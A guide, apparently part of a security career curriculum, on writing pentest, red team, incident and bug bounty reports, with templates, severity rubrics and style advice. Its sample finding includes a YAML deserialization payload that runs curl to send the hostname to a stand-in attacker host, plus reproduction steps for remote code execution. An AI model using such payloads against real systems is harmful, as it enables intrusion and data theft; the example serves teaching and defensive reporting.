# 📋 Pentest & Red Team Reporting

> The deliverable. After all the technical work, the report is what the client pays for and what hiring managers will judge you on. A great pentester with a mediocre report gets passed over for a competent pentester with a great report.

For roles in: **any consulting / pentest position**, **internal red team writeups**, **CSIRT incident reports**, **vendor research blogs**, **bug bounty submissions**.

## Why reporting matters more than you think

Your report has three audiences:

1. **The C-suite / sponsor** — wants to know: *what's our risk, what does it cost to fix, did we get our money's worth?*
2. **The technical owner** — wants to know: *exactly how to reproduce, exactly how to fix, exactly which systems are affected.*
3. **The auditor / regulator** (sometimes) — wants to know: *was due diligence performed and documented?*

Each audience needs a different layer of the same report. A report that only speaks to one of them fails the others.

## The structure

```
1. Executive Summary             ← The C-suite read this
2. Engagement Details             ← Scope, dates, methodology
3. Risk Summary                   ← Heat map, top 5 findings
4. Findings (one per finding)     ← The technical owners read these
5. Methodology / Tools Used
6. Strategic Recommendations
7. Appendices                    ← Evidence, raw data, tool output
```

Industry templates worth studying:
- **[OffSec PWK / OSCP report template](https://www.offsec.com/pwk-online/PWKv1-REPORT.docx)** — minimum bar, but a real template
- **[TCM Security PNPT template](https://academy.tcm-sec.com/p/professional-pentester)** — Heath Adams' template, well-structured
- **[Mandiant report style](https://www.mandiant.com/resources)** — read public APT1, APT41 reports for the gold standard
- **[CrowdStrike Services reports](https://www.crowdstrike.com/blog/category/incident-response/)** — incident-focused
- **[NIST SP 800-115](https://csrc.nist.gov/pubs/sp/800/115/final)** — official methodology guidance
- **[PTES — Penetration Testing Execution Standard](http://www.pentest-standard.org/)** — community framework
- **[OWASP WSTG, MASTG, ASVS](https://owasp.org/projects/)** — for web/mobile-specific reports

## Executive summary — get this right

This is the first page after the cover. Half the readers won't go past it. It must:

1. **State the engagement type** in one sentence ("External pentest of corp.example.com between Mar 1–15, 2026").
2. **State the bottom-line conclusion** ("8 findings: 1 Critical, 2 High, 3 Medium, 2 Low. Critical finding allowed unauthenticated remote code execution on internet-facing infrastructure.").
3. **Quantify the business impact** ("Exploitation could have led to data exposure for ~2.4M customer records and brand-damaging ransomware deployment").
4. **Give 3–5 strategic recommendations** at a level a CEO can act on ("Implement a formal patch management program", "Rotate all administrative credentials and enforce MFA", "Engage external IR retainer").
5. **Be ≤ 1 page**. Every sentence has to earn its place.

Avoid:
- Jargon without explanation (CISOs read these too — but you also have product execs)
- Tool names instead of impact ("we ran nmap and found...")
- Defensive hedging ("we *might* have been able to...")
- Findings that read as findings rather than as risk ("MS17-010 unpatched" → "Unpatched 7-year-old vulnerability allows complete compromise of customer service infrastructure")

## Engagement details

```
Engagement type:    External penetration test
Client:             ACME Corp (https://acme.example)
Scope:              acme.example, *.acme.example (excluding *.dev.acme.example)
Out of scope:       Production database servers, third-party SaaS
Test window:        2026-03-01 09:00 UTC to 2026-03-15 18:00 UTC
Test methodology:   PTES + OWASP WSTG
Lead tester:        First Last (OSCP, OSEP)
Authorized contact: jane.doe@acme.example
ROE document:       (signed, on file)
```

This section establishes legitimacy and scope. If a finding is later found in production, the scope statement protects both parties.

## Risk summary

A heat map (likelihood × impact) with each finding plotted, plus a one-table summary of every finding ranked by risk. Use **CVSS 3.1 / 4.0** for the per-finding base score, but augment with **business context** for the actual ranking — a CVSS 7.5 finding on an internet-facing crown-jewel system outranks a CVSS 9.8 on an isolated test box.

```
Finding             Severity    CVSS    Status        Recommendation
F-01 RCE in /api    Critical    9.8     Open          Patch immediately + rotate creds
F-02 SQL injection  High        8.1     Open          Parameterize queries
F-03 Stored XSS     High        7.4     Open          Use auto-escaping framework
F-04 Weak ciphers   Medium      5.9     Open          Disable TLS 1.0/1.1
…
```

## A great finding writeup

The atomic unit of the report. Each finding should have:

```markdown
## F-01 — Unauthenticated Remote Code Execution in /api/v1/import

**Severity**: Critical
**CVSS 3.1**: 9.8 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)
**Affected**: api.acme.example (1 endpoint)
**Status**: Open
**ATT&CK**: T1190 (Exploit Public-Facing Application)

### Summary

The `/api/v1/import` endpoint accepts a `source_url` parameter and fetches it server-side
without validation. Including `file:///` or internal URLs allows arbitrary file read; a
crafted YAML payload triggers PyYAML's `Loader=Loader` deserialization path, leading to
unauthenticated remote code execution as the application user.

### Evidence

Request:
```http
POST /api/v1/import HTTP/1.1
Host: api.acme.example
Content-Type: application/json

{"source_url": "http://attacker.example/payload.yaml"}
```

Server fetches `http://attacker.example/payload.yaml` containing:
```yaml
!!python/object/apply:os.system
- "curl http://attacker.example/in?h=$(hostname)"
```

Server's outbound DNS log confirmed the callback (timestamp 14:22:08 UTC).
Reverse shell achieved via the same vector at 14:23:55 UTC. Screenshot: Appendix A-1.

### Reproduction

1. Set up a listener: `python3 -m http.server 8080` on a host the target can reach.
2. Place the YAML payload as `payload.yaml`.
3. POST to /api/v1/import with `source_url` pointing at it.
4. Observe RCE.

Tested 2026-03-04 14:20 UTC. ROE-approved exploitation.

### Business impact

The application user has read access to:
- Customer PII database (read replica) — 2.4M records
- AWS IAM role with S3 backup bucket access
- Internal service mesh (lateral movement)

A skilled attacker with this foothold could complete a ransomware deployment within hours.

### Remediation

**Short-term (within 24 hours)**: Block the `/api/v1/import` endpoint at the CDN/WAF layer.

**Medium-term (within 1 week)**:
1. Replace `yaml.load()` with `yaml.safe_load()` in `import_handler.py:42`.
2. Restrict `source_url` to an allow-list of trusted domains.
3. Use SSRF-aware HTTP client (refuse private IP ranges, file:// scheme).
4. Rotate the application's IAM credentials.

**Long-term**: Adopt a Secure SDLC including SAST (Semgrep) on every PR. Specific Semgrep
rule attached as Appendix B-1.

### References

- CWE-502: Deserialization of Untrusted Data
- OWASP A08:2021 Software and Data Integrity Failures
- PyYAML safe_load documentation: https://pyyaml.org/wiki/PyYAMLDocumentation
```

What this finding does well:
- Severity tied to specific business impact, not just CVSS
- Reproducible by a developer who didn't run the test
- Specific code location for the fix (`import_handler.py:42`)
- Three-tier remediation (block now / fix this week / improve forever)
- ATT&CK and CWE/OWASP references for the SOC and the AppSec team

## Severity rubrics

CVSS is a starting point, not the answer. Build a rubric that incorporates:

| Factor | Multiplier |
|---|---|
| Internet-facing | × 1.3 |
| Crown jewel data | × 1.5 |
| No compensating control | × 1.2 |
| Easy reproducibility (public exploit / one HTTP request) | × 1.2 |
| Pre-auth | × 1.4 |
| Lateral movement implication (gets you Tier-0) | × 1.5 |
| Reverse: requires admin / specific timing / VPN access | × 0.6 |

Document your rubric in the report so reviewers can audit decisions.

## Red team-specific reporting

Red team reports differ from pentest reports:

- **Lead with the narrative.** "Initial access via spear-phish on Mar 4. Lateral movement via Kerberoasting on Mar 7. Domain admin on Mar 10. Achieved objective on Mar 12: exfiltrated CFO mailbox to attacker-controlled DropBox account."
- **Map every step to MITRE ATT&CK.** Single biggest ask from blue teams: "what TTPs did you use, in what order?"
- **Detection gap analysis.** For each technique, did the SOC see it? Why not? Often this section is the most valuable in the entire report.
- **Attack path diagram.** Every host, every credential, every pivot. SpecterOps / BloodHound community has good templates; Lucidchart / draw.io work fine.
- **OPSEC analysis.** What would a more sophisticated attacker have done differently? Where was your engagement noisy / risky for the client to detect?

## DFIR-specific reporting

Incident reports add:
- **Timeline (UTC)** — exhaustive, every meaningful event
- **Indicators of Compromise** — to share with peers / threat intel platforms
- **Containment / eradication actions taken** — what *you* did to the environment
- **Lessons learned** — process / detection / preparedness gaps

For court-relevant cases (insider threat, regulatory): **chain of custody** documented per artifact, **hash values** for every image, **examiner credentials** stated, **counter-narrative considered and addressed** — what would a defense lawyer say?

## Bug bounty reporting

Different format, same principles:

- **One vulnerability per report.** Don't bundle.
- **Title** = `[Severity] What is the bug, in one phrase` (e.g., `[Critical] Pre-auth RCE in /api/v1/import via unsafe YAML deserialization`)
- **Steps to reproduce** — minimum viable, copy-pasteable
- **Proof of impact** — actual demonstration; videos help
- **Suggested remediation** — even if just at the level of "use safe_load"

A great bug bounty report gets paid in days. A vague one gets stuck in triage for weeks.

## Tools that help

| Tool | Use |
|---|---|
| **[Dradis](https://dradisframework.com/)** | Collaboration + report generation; commercial CE/Pro |
| **[PlexTrac](https://plextrac.com/)** | Modern report platform, big with consultancies |
| **[Faraday](https://faradaysec.com/)** | Multi-user pentest workspace |
| **[SysReptor](https://docs.sysreptor.com/)** | Open-source modern report-as-code |
| **[Pwndoc](https://github.com/pwndoc/pwndoc)** | Free, mature, community-maintained |
| **[Reconmap](https://reconmap.org/)** | Workflow + reporting |
| **[GhostWriter](https://github.com/GhostManager/Ghostwriter)** (SpecterOps) | Red-team-flavored, great DOCX templating |
| **VS Code + Markdown + pandoc** | What many of us actually use |

The best report tool is the one your team will consistently use. The fanciest platform doesn't help if data falls out of it.

## Anti-patterns

The most common mistakes in pentest reports:

- **Tool dump as findings.** "Nessus says…" — your job is the analysis, not the tool's output.
- **No business context.** A finding that doesn't say *why it matters* doesn't get fixed.
- **CVSS-only severity.** Inflates everything to High by ignoring environment.
- **Missing reproduction steps.** The dev can't fix what they can't see.
- **No screenshots / no evidence.** Claims without proof get pushed back.
- **Vague remediation.** "Implement input validation" — *which input, where, in what way?*
- **Long-prose padding.** Reports aren't paid by the page.
- **Findings rated Critical that aren't.** Cry-wolf erosion of trust.

## Style notes

- **Active voice, present tense.** "The endpoint discloses…" not "It was found that the endpoint may have disclosed…"
- **Specific over general.** "Five admin accounts have passwords ≤ 8 characters" beats "Weak password policy."
- **Numbers and dates.** "27 of 312 services unpatched (8.7%)" anchors the reader.
- **One screenshot per claim is enough.** Don't dump 30 from Burp.
- **Redact secrets and PII** — passwords, tokens, customer data — in the deliverable. Originals stay in your tester's encrypted store.
- **Spell-check + grammar-check** — your credibility evaporates with two typos in the executive summary.

## Templates and skeletons

A reusable section template (in your report-writing tool of choice):

```
## F-NN — [Short title]

**Severity**: [Critical / High / Medium / Low / Info]
**CVSS 3.1**: [X.X (vector)]
**Affected**: [host / endpoint / system]
**Status**: [Open / Fixed / Risk Accepted]
**ATT&CK**: [Txxxx if applicable]
**OWASP**: [Axx:202x if applicable]
**CWE**: [CWE-NNN]

### Summary
[2–3 sentences. What is it, where is it, why does it matter.]

### Evidence
[Request/response, screenshots, log lines, hashes. Reproducible.]

### Business impact
[Concrete consequence: data, dollars, time, brand.]

### Remediation
**Short-term** ([timeframe]): [tactical fix]
**Medium-term** ([timeframe]): [proper fix]
**Long-term**: [process-level fix]

### References
- [CWE / OWASP / vendor / paper links]
```

## Calibrating to your audience

Different orgs want different things:

| Audience | What they want |
|---|---|
| Tech startup | Bullet-point executive summary, deep technical findings, fast turnaround |
| F500 enterprise | Polished PDF, strategic recommendations, compliance mapping (PCI / HIPAA / SOX) |
| Government | NIST SP 800-115 mapping, classification handling, RMF / FedRAMP control linkage |
| Indian CERT-In | Specific format, reporting timeline (6 hours for major incidents under 2022 directive) |
| Bug bounty platform | Platform-specific template, video, no fluff |
| Insurance carrier | Mapping to their incident questionnaire, exact dates and scope |
| Regulator | Lifecycle compliance focus, what was fixed and verified |

Ask up front; deliver in the format requested.

## Hands-on practice

The best way to learn report writing is to write reports nobody pays you for, then have someone tear them apart. Concrete steps:

1. Take an HTB / THM box, write a "professional" pentest report on it as if it were a paid engagement.
2. Post it to your blog or GitHub.
3. Ask peers (or community Discord — TCM, HackTheBox, BHIS) for review.
4. Iterate.
5. Read 5 published reports per month: Mandiant, CrowdStrike, Microsoft Threat Intelligence, NCC Group, Trail of Bits, Project Zero, Volexity, Mandiant M-Trends, NCSC.

By report 10, your structure is solid. By report 30, your prose tightens. By report 100, you're indistinguishable from a senior consultant.

## Recommended reading

- *The Pentester's Field Guide to Reports* — Kim Crawley
- *The Hacker Playbook 3* — has a reports chapter
- *Building Effective Cybersecurity Programs* (Tari Schreider) — bigger picture
- [SANS Reading Room papers on reporting](https://www.sans.org/white-papers/) — search "report"
- [NCC Group public assessments](https://www.nccgroup.com/research/) — model for cryptographic/protocol reports
- [Trail of Bits assessment reports](https://github.com/trailofbits/publications) — open-source, exemplary

## Interview questions

1. *"Walk me through the structure of a pentest report you've written."*
2. *"How do you decide between Critical and High severity?"*
3. *"What's the difference between a pentest report and a red team report?"*
4. *"How do you handle a client disputing a finding?"*
5. *"You found a critical mid-engagement. What's your communication protocol?"*
6. *"Show me a finding writeup from your portfolio. Walk me through it."*

---

[← Phase 5](../05-defense/index.md)  ·  [Certifications →](certifications.md)
